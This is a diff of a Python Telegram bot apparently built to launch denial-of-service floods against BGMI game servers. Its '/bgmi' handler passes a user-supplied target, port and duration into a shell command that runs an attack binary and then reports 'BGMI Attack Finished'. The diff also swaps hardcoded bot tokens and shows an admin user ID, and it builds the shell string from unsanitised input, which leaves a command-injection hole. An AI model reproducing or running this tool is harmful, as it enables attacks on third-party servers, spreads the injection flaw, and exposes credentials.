@@ -8,7 +8,7 @@ import random
 import string
 
 # insert your Telegram bot token here
-bot = telebot.TeleBot('7606194904:AAFBcp0re_-44YD3qRzWUJ4H8bsj4pe8rLw')
+bot = telebot.TeleBot('7606194904:AAFrRS5yd4M9uf04CvjZQDTmjRn86ilJmBQ')
 
 # Admin user IDs
 admin_id = ["6459253633"]
@@ -426,7 +426,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./TEST {target} {port} {time} 1200"
+                full_command = f"./hello {target} {port} {time} 1200"
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
         else:
